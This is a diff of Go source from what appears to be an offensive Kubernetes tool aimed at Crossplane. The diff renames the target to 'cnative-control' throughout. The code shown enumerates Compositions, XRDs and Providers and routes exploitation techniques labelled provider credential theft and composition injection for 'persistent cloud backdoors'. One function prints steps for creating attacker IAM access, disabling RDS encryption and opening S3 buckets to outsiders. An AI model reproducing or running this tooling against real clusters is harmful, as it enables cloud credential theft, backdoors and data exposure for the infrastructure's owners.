@@ -11,19 +11,19 @@ import (
 	"k8s.io/client-go/kubernetes"
 )
 
-var crossplaneCompositionGVR = schema.GroupVersionResource{
+var cnativeControlCompositionGVR = schema.GroupVersionResource{
 	Group: "apiextensions.crossplane.io", Version: "v1", Resource: "compositions",
 }
 
-var crossplaneXRDGVR = schema.GroupVersionResource{
+var cnativeControlXRDGVR = schema.GroupVersionResource{
 	Group: "apiextensions.crossplane.io", Version: "v1", Resource: "compositeresourcedefinitions",
 }
 
-var crossplaneProviderConfigGVR = schema.GroupVersionResource{
+var cnativeControlProviderConfigGVR = schema.GroupVersionResource{
 	Group: "pkg.crossplane.io", Version: "v1", Resource: "providers",
 }
 
-func detectCrossplane(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
+func detectCnativeControl(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
 	namespaces := []string{"crossplane-system", "upbound-system"}
 	for _, ns := range namespaces {
 		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
@@ -31,10 +31,10 @@ func detectCrossplane(ctx context.Context, client kubernetes.Interface) []Detect
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "crossplane",
+				Name:      "cnative-control",
 				Detected:  true,
 				Namespace: ns,
-				Details:   fmt.Sprintf("%d crossplane pods", len(pods.Items)),
+				Details:   fmt.Sprintf("%d cnative-control pods", len(pods.Items)),
 			}}
 		}
 
@@ -43,10 +43,10 @@ func detectCrossplane(ctx context.Context, client kubernetes.Interface) []Detect
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "crossplane",
+				Name:      "cnative-control",
 				Detected:  true,
 				Namespace: ns,
-				Details:   fmt.Sprintf("%d crossplane pods", len(pods.Items)),
+				Details:   fmt.Sprintf("%d cnative-control pods", len(pods.Items)),
 			}}
 		}
 	}
@@ -54,29 +54,29 @@ func detectCrossplane(ctx context.Context, client kubernetes.Interface) []Detect
 	return nil
 }
 
-// ExploitCrossplane executes the specified Crossplane infrastructure exploitation technique.
-func ExploitCrossplane(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
+// ExploitCnativeControl executes the specified cnative-control infrastructure exploitation technique.
+func ExploitCnativeControl(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "enumerate":
-		return crossplaneEnumerate(ctx, client, dynClient)
+		return cnativeControlEnumerate(ctx, client, dynClient)
 	case "provider_creds":
-		return crossplaneProviderCreds(ctx, client, dynClient)
+		return cnativeControlProviderCreds(ctx, client, dynClient)
 	case "composition_inject":
-		return crossplaneCompositionInject(ctx, dynClient)
+		return cnativeControlCompositionInject(ctx, dynClient)
 	case "managed_resource":
-		return crossplaneManagedResource(ctx, client, dynClient)
+		return cnativeControlManagedResource(ctx, client, dynClient)
 	default:
-		return crossplaneEnumerate(ctx, client, dynClient)
+		return cnativeControlEnumerate(ctx, client, dynClient)
 	}
 }
 
-func crossplaneEnumerate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeControlEnumerate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Crossplane Infrastructure Enumeration:\n\n")
+	sb.WriteString("cnative-control Infrastructure Enumeration:\n\n")
 
 	found := false
 
-	compositions, err := dynClient.Resource(crossplaneCompositionGVR).List(ctx, metav1.ListOptions{})
+	compositions, err := dynClient.Resource(cnativeControlCompositionGVR).List(ctx, metav1.ListOptions{})
 	if err == nil && len(compositions.Items) > 0 {
 		found = true
 		fmt.Fprintf(&sb, "  Compositions (%d):\n", len(compositions.Items))
@@ -90,7 +90,7 @@ func crossplaneEnumerate(ctx context.Context, client kubernetes.Interface, dynCl
 		sb.WriteString("\n")
 	}
 
-	xrds, err := dynClient.Resource(crossplaneXRDGVR).List(ctx, metav1.ListOptions{})
+	xrds, err := dynClient.Resource(cnativeControlXRDGVR).List(ctx, metav1.ListOptions{})
 	if err == nil && len(xrds.Items) > 0 {
 		found = true
 		fmt.Fprintf(&sb, "  CompositeResourceDefinitions (%d):\n", len(xrds.Items))
@@ -102,7 +102,7 @@ func crossplaneEnumerate(ctx context.Context, client kubernetes.Interface, dynCl
 		sb.WriteString("\n")
 	}
 
-	providers, err := dynClient.Resource(crossplaneProviderConfigGVR).List(ctx, metav1.ListOptions{})
+	providers, err := dynClient.Resource(cnativeControlProviderConfigGVR).List(ctx, metav1.ListOptions{})
 	if err == nil && len(providers.Items) > 0 {
 		found = true
 		fmt.Fprintf(&sb, "  Providers (%d):\n", len(providers.Items))
@@ -125,7 +125,7 @@ func crossplaneEnumerate(ctx context.Context, client kubernetes.Interface, dynCl
 	}
 
 	if !found {
-		sb.WriteString("  No Crossplane resources detected\n")
+		sb.WriteString("  No cnative-control resources detected\n")
 	}
 
 	return &EvasionResult{
@@ -135,11 +135,11 @@ func crossplaneEnumerate(ctx context.Context, client kubernetes.Interface, dynCl
 	}, nil
 }
 
-func crossplaneProviderCreds(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeControlProviderCreds(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Crossplane Provider Credential Theft:\n\n")
+	sb.WriteString("cnative-control Provider Credential Theft:\n\n")
 
-	sb.WriteString("  Crossplane providers use ProviderConfig with cloud credentials.\n")
+	sb.WriteString("  cnative-control providers use ProviderConfig with cloud credentials.\n")
 	sb.WriteString("  These credentials have infrastructure-level access (create/delete VMs, DBs, etc).\n\n")
 
 	_ = dynClient
@@ -190,14 +190,14 @@ func crossplaneProviderCreds(ctx context.Context, client kubernetes.Interface, d
 	}, nil
 }
 
-func crossplaneCompositionInject(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeControlCompositionInject(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Crossplane Composition Injection:\n\n")
+	sb.WriteString("cnative-control Composition Injection:\n\n")
 
 	sb.WriteString("  Compositions define what cloud resources are created.\n")
 	sb.WriteString("  Injecting resources into a Composition creates persistent cloud backdoors.\n\n")
 
-	compositions, err := dynClient.Resource(crossplaneCompositionGVR).List(ctx, metav1.ListOptions{})
+	compositions, err := dynClient.Resource(cnativeControlCompositionGVR).List(ctx, metav1.ListOptions{})
 	if err != nil {
 		fmt.Fprintf(&sb, "  Cannot list Compositions: %v\n", err)
 		return &EvasionResult{Technique: "composition_inject", Success: false, Output: sb.String()}, nil
@@ -241,9 +241,9 @@ func crossplaneCompositionInject(ctx context.Context, dynClient dynamic.Interfac
 	}, nil
 }
 
-func crossplaneManagedResource(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeControlManagedResource(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Crossplane Managed Resource Enumeration:\n\n")
+	sb.WriteString("cnative-control Managed Resource Enumeration:\n\n")
 
 	sb.WriteString("  Managed Resources represent actual cloud infrastructure.\n")
 	sb.WriteString("  Modifying them directly changes live cloud resources.\n\n")
@@ -287,7 +287,7 @@ func crossplaneManagedResource(ctx context.Context, client kubernetes.Interface,
 	sb.WriteString("    2. Create new IAM managed resource for attacker access\n")
 	sb.WriteString("    3. Modify RDS instance to disable encryption/make public\n")
 	sb.WriteString("    4. Add S3 BucketPolicy granting external access\n")
-	sb.WriteString("    5. Crossplane reconciles: deletions are recreated automatically\n")
+	sb.WriteString("    5. cnative-control reconciles: deletions are recreated automatically\n")
 	sb.WriteString("    6. Drift detection delay: changes persist until next reconcile\n")
 
 	return &EvasionResult{
